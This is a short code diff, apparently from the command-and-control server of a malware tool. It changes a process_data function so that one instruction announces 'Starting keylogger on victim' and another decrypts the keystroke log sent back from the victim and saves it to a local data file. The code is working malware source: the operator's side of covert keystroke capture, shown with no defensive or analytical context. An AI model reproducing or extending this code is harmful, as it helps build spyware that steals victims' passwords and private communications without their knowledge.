@@ -324,9 +324,14 @@ def process_sniff_pkt(pkt):
 def process_data(instruction, data, filename=""):
 
     if instruction == "1":
-        print(instruction)
+        print(f"Starting keylogger on victim.")
     elif instruction == "2":
-        print(instruction)
+        print(f"Stopped keylogger and saving log file from victim.")
+        decrypted_data = encryption.decrypt(data.encode('utf-8'))
+        # print(decrypted_data)
+        with open(file=f"data/{filename}", mode='wb') as file:
+            file.write(decrypted_data)
+        print(f"Output: <app_directory>/data/{filename}")
     elif instruction == "3":
         print(f"Instruction: {instruction}")
         decrypted_data = encryption.decrypt(data.encode('utf-8')).decode('utf-8')
